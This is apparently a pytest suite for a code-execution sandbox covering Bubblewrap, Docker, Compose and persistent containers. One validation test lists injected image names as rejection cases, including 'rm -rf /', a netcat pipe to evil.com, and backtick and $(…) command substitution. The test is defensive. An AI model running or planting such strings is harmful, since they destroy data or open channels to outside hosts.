import pytest
import os
import sys
import shutil
import subprocess as spc
from pathlib import Path
from util.sandbox import NativeRestrictor, ContainerSandbox, ComposeSandbox, PersistentSandbox
from util.errors import ConfigError, ExecutionError
from runner.base_runner import BaseRunner

class TestNativeRestrictor:
    def test_bwrap_command_construction_linux(self, monkeypatch):
        monkeypatch.setattr(sys, "platform", "linux")
        monkeypatch.setattr(shutil, "which", lambda cmd: "/usr/bin/bwrap" if cmd == "bwrap" else None)

        cmd = ["gcc", "main.c", "-o", "main.out"]
        wrapped = NativeRestrictor.wrap_command(cmd, net=False, cwd="/workspace", compiling=True)

        assert wrapped[0] == "bwrap"
        assert "--ro-bind" in wrapped
        assert "--tmpfs" in wrapped
        assert "/tmp" in wrapped
        assert "--unshare-user" in wrapped
        assert "--unshare-ipc" in wrapped
        assert "--unshare-pid" in wrapped
        assert "--unshare-uts" in wrapped
        assert "--unshare-cgroup-try" in wrapped
        assert "--die-with-parent" in wrapped
        assert "--new-session" in wrapped
        assert "--unshare-net" in wrapped
        assert "--bind" in wrapped
        assert "/workspace" in wrapped
        assert wrapped[-5] == "--"
        assert wrapped[-4:] == cmd

        for masked in ["/home", "/root", "/run", "/sys"]:
            idx = wrapped.index(masked)
            assert wrapped[idx - 1] == "--tmpfs"

    def test_bwrap_network_isolation_toggle(self, monkeypatch):
        monkeypatch.setattr(sys, "platform", "linux")
        monkeypatch.setattr(shutil, "which", lambda cmd: "/usr/bin/bwrap" if cmd == "bwrap" else None)

        cmd = ["python", "app.py"]
        wrapped_no_net = NativeRestrictor.wrap_command(cmd, net=False, cwd="/app")
        assert "--unshare-net" in wrapped_no_net

        wrapped_with_net = NativeRestrictor.wrap_command(cmd, net=True, cwd="/app")
        assert "--unshare-net" not in wrapped_with_net

    def test_bwrap_missing_binary_raises_config_error(self, monkeypatch):
        monkeypatch.setattr(sys, "platform", "linux")
        monkeypatch.setattr(shutil, "which", lambda cmd: None)

        with pytest.raises(ConfigError, match="Bubblewrap.*not found"):
            NativeRestrictor.wrap_command(["ls"], cwd="/app")

    def test_macos_restriction_raises_config_error(self, monkeypatch):
        monkeypatch.setattr(sys, "platform", "darwin")
        with pytest.raises(ConfigError, match="only supported on Linux.*Bubblewrap"):
            NativeRestrictor.wrap_command(["ls", "-la"])

    def test_base_runner_restrict_on_macos_raises_config_error(self, monkeypatch):
        monkeypatch.setattr(sys, "platform", "darwin")
        from runner.base_runner import BaseRunner
        runner = BaseRunner({"restrict": True})
        with pytest.raises(ConfigError, match="only supported on Linux"):
            runner.run_command(["echo", "hello"], compiling=False)

    def test_bwrap_compiling_vs_executing_mount_mode(self, monkeypatch):
        monkeypatch.setattr(sys, "platform", "linux")
        monkeypatch.setattr(shutil, "which", lambda cmd: "/usr/bin/bwrap" if cmd == "bwrap" else None)

        compile_cmd = ["gcc", "-c", "main.c", "-o", "main.o"]
        wrapped_compile = NativeRestrictor.wrap_command(compile_cmd, cwd="/app", compiling=True)
        assert "--bind" in wrapped_compile
        assert "/app" in wrapped_compile

        exec_cmd = ["./main.out"]
        wrapped_exec = NativeRestrictor.wrap_command(exec_cmd, cwd="/app", compiling=False)
        assert "--ro-bind" in wrapped_exec
        assert "/app" in wrapped_exec

    def test_base_runner_restrict_enforces_sandbox_on_compilation(self, monkeypatch):
        monkeypatch.setattr(sys, "platform", "linux")
        monkeypatch.setattr(shutil, "which", lambda cmd: "/usr/bin/bwrap" if cmd == "bwrap" else None)
        from runner.base_runner import BaseRunner

        captured_cmds = []

        class FakeP:
            returncode = 0

            def communicate(self, timeout=None):
                return (b"", b"")

        def fake_popen(cmd, **kwargs):
            captured_cmds.append(cmd)
            return FakeP()

        monkeypatch.setattr(spc, "Popen", fake_popen)
        runner = BaseRunner({"restrict": True})
        runner.run_command(["gcc", "-c", "main.c"], compiling=True)
        assert len(captured_cmds) == 1
        assert captured_cmds[0][0] == "bwrap"
        assert "--bind" in captured_cmds[0]

    def test_unsupported_os_raises_config_error(self, monkeypatch):
        monkeypatch.setattr(sys, "platform", "win32")
        with pytest.raises(ConfigError, match="only supported on Linux"):
            NativeRestrictor.wrap_command(["dir"])


class TestContainerSandbox:
    def test_get_engine_docker_detected(self, monkeypatch):
        monkeypatch.setattr(shutil, "which", lambda cmd: "/usr/bin/docker" if cmd == "docker" else None)
        
        class FakeRun:
            returncode = 0
            stdout = "Docker info output"
            stderr = ""

        monkeypatch.setattr(spc, "run", lambda *args, **kwargs: FakeRun())
        engine = ContainerSandbox._get_engine()
        assert engine == "docker"

    def test_get_engine_podman_fallback(self, monkeypatch):
        def fake_which(cmd):
            if cmd == "podman": return "/usr/bin/podman"
            return None
        monkeypatch.setattr(shutil, "which", fake_which)

        class FakeRun:
            returncode = 0
            stdout = "podman version"
            stderr = ""

        monkeypatch.setattr(spc, "run", lambda *args, **kwargs: FakeRun())
        engine = ContainerSandbox._get_engine()
        assert engine == "podman"

    def test_get_engine_missing_raises_config_error(self, monkeypatch):
        monkeypatch.setattr(shutil, "which", lambda cmd: None)
        with pytest.raises(ConfigError, match="No container engine"):
            ContainerSandbox._get_engine()

    def test_heuristic_image_selection(self):
        assert ContainerSandbox.get_heuristic_image(["gcc", "main.c"]) == "gcc:latest"
        assert ContainerSandbox.get_heuristic_image(["g++", "main.cpp"]) == "gcc:latest"
        assert ContainerSandbox.get_heuristic_image(["python", "script.py"]) == "python:3-slim"
        assert ContainerSandbox.get_heuristic_image(["rustc", "main.rs"]) == "rust:latest"
        assert ContainerSandbox.get_heuristic_image(["javac", "Main.java"]) == "openjdk:latest"
        assert ContainerSandbox.get_heuristic_image(["go", "run", "."]) == "golang:latest"
        assert ContainerSandbox.get_heuristic_image(["node", "index.js"]) == "node:latest"
        assert ContainerSandbox.get_heuristic_image(["ruby", "app.rb"]) == "ruby:latest"

    def test_wrap_command_security_and_tmp_isolation(self, monkeypatch):
        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
        cmd = ["python", "main.py"]
        wrapped = ContainerSandbox.wrap_command(cmd, net=False, compiling=False)

        assert wrapped[0] == "docker"
        assert "run" in wrapped
        assert "--rm" in wrapped
        assert "--security-opt=no-new-privileges" in wrapped
        assert "--cap-drop=ALL" in wrapped
        assert "--network" in wrapped
        assert "none" in wrapped
        # Verify host /tmp is NOT bind-mounted
        for idx, token in enumerate(wrapped):
            if token == "-v" and idx + 1 < len(wrapped):
                assert wrapped[idx + 1] != "/tmp:/tmp"

    def test_wrap_command_user_uid_gid_mapping(self, monkeypatch):
        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
        cmd = ["python", "main.py"]
        wrapped = ContainerSandbox.wrap_command(cmd)
        if hasattr(os, "getuid") and hasattr(os, "getgid"):
            assert "--user" in wrapped
            u_idx = wrapped.index("--user")
            assert wrapped[u_idx + 1] == f"{os.getuid()}:{os.getgid()}"

        # Test explicit user override in sandbox_cfg
        wrapped_custom = ContainerSandbox.wrap_command(cmd, sandbox_cfg={"user": "1001:1001"})
        assert "--user" in wrapped_custom
        c_idx = wrapped_custom.index("--user")
        assert wrapped_custom[c_idx + 1] == "1001:1001"

    def test_wrap_command_compiling_mount_mode(self, monkeypatch):
        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
        cwd = os.getcwd()
        cmd = ["gcc", "main.c"]
        wrapped_comp = ContainerSandbox.wrap_command(cmd, compiling=True)
        assert f"{cwd}:{cwd}:rw" in wrapped_comp

        wrapped_run = ContainerSandbox.wrap_command(cmd, compiling=False)
        assert f"{cwd}:{cwd}:ro" in wrapped_run

    def test_build_dockerfile_caching(self, tmp_path, monkeypatch):
        df = tmp_path / "Dockerfile"
        df.write_text("FROM alpine\nRUN echo hello\n")
        
        class FakeRun:
            returncode = 0
            stdout = "image-id-123\n"
            stderr = ""

        monkeypatch.setattr(spc, "run", lambda *args, **kwargs: FakeRun())
        image_name = ContainerSandbox._build_dockerfile(str(df), "docker")
        assert image_name.startswith("run-sandbox-")

    def test_build_dockerfile_missing_file_raises_error(self):
        with pytest.raises(ConfigError, match="Dockerfile 'nonexistent' not found"):
            ContainerSandbox._build_dockerfile("nonexistent", "docker")

    def test_build_dockerfile_warns_missing_dockerignore(self, tmp_path, monkeypatch):
        df = tmp_path / "Dockerfile"
        df.write_text("FROM alpine\nRUN echo hello\n")
        
        warnings = []
        monkeypatch.setattr("util.sandbox.Printer.warning", lambda msg: warnings.append(msg))
        monkeypatch.setattr(spc, "run", lambda *args, **kwargs: type("FakeRun", (), {"returncode": 0, "stdout": "id\n", "stderr": ""})())
        
        ContainerSandbox._build_dockerfile(str(df), "docker")
        assert any("No .dockerignore found" in w for w in warnings)

    def test_build_dockerfile_with_dockerignore_no_warning(self, tmp_path, monkeypatch):
        df = tmp_path / "Dockerfile"
        df.write_text("FROM alpine\nRUN echo hello\n")
        (tmp_path / ".dockerignore").write_text("node_modules\n.git\n")
        
        warnings = []
        monkeypatch.setattr("util.sandbox.Printer.warning", lambda msg: warnings.append(msg))
        monkeypatch.setattr(spc, "run", lambda *args, **kwargs: type("FakeRun", (), {"returncode": 0, "stdout": "id\n", "stderr": ""})())
        
        ContainerSandbox._build_dockerfile(str(df), "docker")
        assert not any("No .dockerignore found" in w for w in warnings)

    def test_build_dockerfile_copy_instruction_hash(self, tmp_path, monkeypatch):
        df = tmp_path / "Dockerfile"
        df.write_text("FROM alpine\nCOPY . /app\n")
        
        monkeypatch.setattr(spc, "run", lambda *args, **kwargs: type("FakeRun", (), {"returncode": 0, "stdout": "id\n", "stderr": ""})())
        
        img1 = ContainerSandbox._build_dockerfile(str(df), "docker")
        # Touch directory / change mtime
        new_time = os.path.getmtime(tmp_path) + 10
        os.utime(tmp_path, (new_time, new_time))
        img2 = ContainerSandbox._build_dockerfile(str(df), "docker")
        assert img1 != img2

    def test_validate_image_name_valid(self):
        valid_images = [
            "ubuntu:latest",
            "gcc:12.2",
            "python:3-slim",
            "docker.io/library/alpine:3.18",
            "ghcr.io/org/repo/app:v1.0.0",
            "localhost:5000/custom-img:latest",
            "alpine@sha256:e7d88de73db3d3a9418d76fb8f20a1377e59e651e6bdd7a666acdbd84bf960bc",
        ]
        for img in valid_images:
            assert ContainerSandbox.validate_image_name(img) == img

    def test_validate_image_name_injection_rejected(self):
        malicious_images = [
            "--privileged",
            "-v /:/host ubuntu",
            "--network host alpine",
            "ubuntu; rm -rf /",
            "alpine | nc evil.com 1337",
            "image`whoami`",
            "image$(id)",
            "image name with spaces",
            "",
            "   ",
        ]
        for bad_img in malicious_images:
            with pytest.raises(ConfigError, match="Invalid container image|cannot be empty"):
                ContainerSandbox.validate_image_name(bad_img)

    def test_wrap_command_rejects_injected_image(self, monkeypatch):
        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
        with pytest.raises(ConfigError, match="Invalid container image"):
            ContainerSandbox.wrap_command(["echo", "1"], sandbox_cfg={"image": "--privileged ubuntu"})

    def test_wrap_command_forwards_custom_env(self, monkeypatch):
        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
        cmd = ["python", "app.py"]
        custom = {"APP_ENV": "production", "PORT": "8080"}
        wrapped = ContainerSandbox.wrap_command(cmd, custom_env=custom)
        assert "-e" in wrapped
        assert "APP_ENV=production" in wrapped
        assert "PORT=8080" in wrapped

    def test_wrap_command_assigns_container_name(self, monkeypatch):
        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
        cmd = ["echo", "test"]
        wrapped = ContainerSandbox.wrap_command(cmd)
        assert "--name" in wrapped
        name_idx = wrapped.index("--name")
        assert wrapped[name_idx + 1].startswith("run-sandbox-")

        # Custom container name
        wrapped_custom = ContainerSandbox.wrap_command(cmd, sandbox_cfg={"container_name": "custom-box-42"})
        assert "--name" in wrapped_custom
        c_idx = wrapped_custom.index("--name")
        assert wrapped_custom[c_idx + 1] == "custom-box-42"

    def test_base_runner_kills_container_on_timeout(self, monkeypatch):
        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
        killed_cmds = []

        class TimeoutPopen:
            returncode = None
            def communicate(self, timeout=None):
                raise spc.TimeoutExpired(cmd="docker run", timeout=timeout)
            def kill(self):
                pass
            def wait(self, timeout=None):
                pass

        def fake_run(cmd, *args, **kwargs):
            killed_cmds.append(cmd)
            class FakeRes:
                returncode = 0
            return FakeRes()

        monkeypatch.setattr(spc, "Popen", lambda *args, **kwargs: TimeoutPopen())
        monkeypatch.setattr(spc, "run", fake_run)

        runner = BaseRunner({"sandbox": True, "timeout": 1})
        with pytest.raises(ExecutionError, match="timed out after 1 seconds"):
            runner.run_command(["sleep", "10"])

        # Assert docker kill <container-name> was issued
        assert any(len(c) == 3 and c[0] == "docker" and c[1] == "kill" and c[2].startswith("run-sandbox-") for c in killed_cmds)


class TestComposeSandbox:
    def test_compose_setup_and_teardown(self, monkeypatch):
        calls = []
        class FakeRun:
            returncode = 0
            stdout = ""
            stderr = ""

        def fake_run(cmd, *args, **kwargs):
            calls.append(cmd)
            return FakeRun()

        monkeypatch.setattr(spc, "run", fake_run)
        ComposeSandbox.setup("docker-compose.yml")
        assert calls[0] == ["docker", "compose", "-f", "docker-compose.yml", "up", "-d"]

        ComposeSandbox.teardown("docker-compose.yml")
        assert calls[1] == ["docker", "compose", "-f", "docker-compose.yml", "down"]

    def test_compose_setup_failure_raises_error(self, monkeypatch):
        class FakeRun:
            returncode = 1
            stdout = ""
            stderr = "failed to start"

        monkeypatch.setattr(spc, "run", lambda *args, **kwargs: FakeRun())
        with pytest.raises(ConfigError, match="Failed to start docker-compose"):
            ComposeSandbox.setup("bad-compose.yml")

    def test_compose_wrap_command(self):
        cmd = ["pytest", "tests/"]
        wrapped = ComposeSandbox.wrap_command(cmd, "docker-compose.yml", "app")
        assert "exec" in wrapped
        assert "-T" in wrapped
        # Verify host CWD is NOT blindly passed as -w
        assert f"-w {os.getcwd()}" not in " ".join(wrapped)
        if hasattr(os, "getuid") and hasattr(os, "getgid"):
            assert "--user" in wrapped
            assert f"{os.getuid()}:{os.getgid()}" in wrapped
        assert wrapped[-2:] == ["app", "pytest"] or "app" in wrapped

        # Verify configured compose_workdir and custom env
        wrapped_custom = ComposeSandbox.wrap_command(
            cmd,
            "docker-compose.yml",
            "app",
            custom_env={"KEY": "VAL"},
            sandbox_cfg={"compose_workdir": "/workspace"}
        )
        assert "-w" in wrapped_custom
        w_idx = wrapped_custom.index("-w")
        assert wrapped_custom[w_idx + 1] == "/workspace"
        assert "-e" in wrapped_custom
        assert "KEY=VAL" in wrapped_custom


class TestPersistentSandbox:
    def test_persistent_start_wrap_stop(self, monkeypatch):
        calls = []
        class FakeRun:
            returncode = 0
            stdout = "container-id-abc\n"
            stderr = ""

        def fake_run(cmd, *args, **kwargs):
            calls.append(cmd)
            return FakeRun()

        monkeypatch.setattr(spc, "run", fake_run)
        PersistentSandbox.start("docker", "ubuntu:latest", net=False, cwd="/workspace")
        assert PersistentSandbox._container_id == "container-id-abc"
        run_call = next(c for c in calls if "run" in c)
        assert "--security-opt=no-new-privileges" in run_call
        assert "--cap-drop=ALL" in run_call
        assert "--label" in run_call
        assert "run.sandbox.persistent=true" in run_call
        assert "/tmp:/tmp" not in run_call

        wrapped = PersistentSandbox.wrap_command(["echo", "1"])
        assert wrapped == ["docker", "exec", "-w", os.getcwd(), "container-id-abc", "echo", "1"]

        PersistentSandbox.stop()
        assert PersistentSandbox._container_id is None
        assert calls[-1] == ["docker", "stop", "container-id-abc"]

    def test_persistent_mount_ro_for_non_compiled(self, monkeypatch):
        calls = []
        class FakeRun:
            returncode = 0
            stdout = "container-id-ro\n"
            stderr = ""

        monkeypatch.setattr(spc, "run", lambda cmd, *args, **kwargs: (calls.append(cmd), FakeRun())[1])
        PersistentSandbox.start("docker", "python:3-slim", cwd="/workspace", writable=False)
        run_call = next(c for c in calls if "run" in c)
        assert "/workspace:/workspace:ro" in run_call
        PersistentSandbox.stop()

    def test_persistent_reap_orphaned_containers(self, monkeypatch):
        rm_calls = []
        # Return two containers: one belonging to a dead PID (999999), one belonging to self (os.getpid())
        ps_output = f"cid-dead 999999\ncid-self {os.getpid()}\n"
        
        class FakeRun:
            returncode = 0
            stdout = ps_output
            stderr = ""

        def fake_run(cmd, *args, **kwargs):
            if "rm" in cmd:
                rm_calls.append(cmd)
            return FakeRun()

        monkeypatch.setattr(spc, "run", fake_run)
        reaped = PersistentSandbox.reap_orphaned_containers("docker")
        assert reaped == 1
        assert len(rm_calls) == 1
        assert rm_calls[0] == ["docker", "rm", "-f", "cid-dead"]

    def test_persistent_wrap_without_start_raises_error(self):
        PersistentSandbox._container_id = None
        with pytest.raises(ExecutionError, match="Persistent container is not running"):
            PersistentSandbox.wrap_command(["ls"])

    def test_persistent_start_failure_raises_error(self, monkeypatch):
        class FakeRun:
            returncode = 1
            stdout = ""
            stderr = "port collision"

        monkeypatch.setattr(spc, "run", lambda *args, **kwargs: FakeRun())
        with pytest.raises(ConfigError, match="Failed to start persistent container"):
            PersistentSandbox.start("docker", "ubuntu:latest", cwd="/app")
